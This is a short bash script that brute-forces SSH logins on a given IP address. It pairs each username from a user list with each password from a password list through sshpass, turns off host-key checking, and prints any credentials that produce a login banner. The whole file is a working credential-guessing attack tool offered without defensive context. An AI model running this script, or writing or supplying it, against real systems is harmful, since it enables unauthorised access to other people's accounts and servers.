ip_addr=$1
user='user.txt'
i=0
while read user;do
	pass='pass.txt'
	while read pass;do
		#echo sshpass -p $pass ssh $user@$ip_addr
		
		#queryvalue="$(sshpass -p $pass ssh -o StrictHostKeyChecking=no -T $user@$ip_addr 2> /dev/null | grep -o 'Last')"
		queryvalue="$(sshpass -p $pass ssh -o StrictHostKeyChecking=no -T $user@$ip_addr 2> /dev/null | grep -o 'Last')"
		i=$((i+1))
		#lvalue="Welcome"
		lvalue="Last"
		#queryvalue="Last"
		if [ "$queryvalue" != "" ]
		then
			if [ $queryvalue == $lvalue ]
			then
				echo "Username = "$user" and Password = "$pass" Attempt = "$i
				k=1
				break	
			fi
		fi 
	done<$pass
	if [ "$k" == "1" ]
	then
		break
	fi
done<$user
p=1
if [ "$k" != "$p" ]
then
	echo "No Success"
fi
